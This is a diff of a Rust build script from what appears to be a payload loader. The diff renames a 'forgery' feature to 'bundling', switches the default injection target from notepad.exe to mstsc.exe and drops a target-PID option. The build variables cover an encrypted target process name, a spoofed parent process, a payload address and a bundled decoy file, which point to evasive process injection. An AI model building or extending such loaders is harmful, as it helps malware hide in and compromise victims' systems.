@@ -17,14 +17,13 @@ fn main() {
     // Environment variables to watch for changes
     let env_vars = [
         "CARGO_FEATURE_WIN7",
-        "CARGO_FEATURE_WITH_FORGERY",
         "RSL_TARGET_PROGRAM",
-        "RSL_TARGET_PID",
         "RSL_ICON_PATH",
         "RSL_BUNDLE_FILE",
         "RSL_BUNDLE_FILENAME",
         "RSL_DEFAULT_PAYLOAD_ADDRESS",
         "RSL_PARENT_PROCESS_NAME",
+        "CARGO_FEATURE_WITH_BUNDLING",
     ];
 
     for var in &env_vars {
@@ -32,7 +31,7 @@ fn main() {
     }
 
     // Set compile-time environment variable for bundle filename if with_forgery feature is enabled
-    if env::var("CARGO_FEATURE_WITH_FORGERY").is_ok() {
+    if env::var("CARGO_FEATURE_WITH_BUNDLING").is_ok() {
         let bundle_filename = env::var("RSL_BUNDLE_FILENAME").unwrap_or_default();
         println!("cargo:rustc-env=RSL_BUNDLE_FILENAME={}", bundle_filename);
         copy_bundle_file();
@@ -51,19 +50,10 @@ fn main() {
     // Encrypt target program if pattern2 feature is enabled
     if env::var("CARGO_FEATURE_PATTERN2").is_ok() {
         let target_program =
-            env::var("RSL_TARGET_PROGRAM").unwrap_or_else(|_| r"notepad.exe".to_string());
+            env::var("RSL_TARGET_PROGRAM").unwrap_or_else(|_| r"mstsc.exe".to_string());
         println!(
             "cargo:rustc-env=RSL_ENCRYPTED_TARGET_PROGRAM={}",
             simple_encrypt(target_program.as_bytes())
-        );
-    }
-
-    // Encrypt target PID if pattern3 feature is enabled
-    if env::var("CARGO_FEATURE_PATTERN3").is_ok() {
-        let target_pid = env::var("RSL_TARGET_PID").unwrap_or_else(|_| "0".to_string());
-        println!(
-            "cargo:rustc-env=RSL_ENCRYPTED_TARGET_PID={}",
-            simple_encrypt(target_pid.as_bytes())
         );
     }
 
@@ -92,7 +82,7 @@ fn main() {
 
 fn copy_bundle_file() {
     let bundle_file = env::var("RSL_BUNDLE_FILE")
-        .expect("RSL_BUNDLE_FILE environment variable must be set when using with_forgery feature");
+        .expect("RSL_BUNDLE_FILE environment variable must be set when using with_bundling feature");
 
     // Ensure absolute path
     let bundle_file = std::path::Path::new(&bundle_file);
@@ -107,7 +97,7 @@ fn copy_bundle_file() {
         "pub const MEMORY_FILE: &[u8] = include_bytes!(r\"{}\");\n",
         bundle_file_str
     );
-    fs::write("src/forgery/bundle_data.rs", content).expect("Failed to write bundle_data.rs");
+    fs::write("src/bundle/bundle_data.rs", content).expect("Failed to write bundle_data.rs");
 
     println!(
         "cargo:note=Generated bundle_data.rs with file: {}",
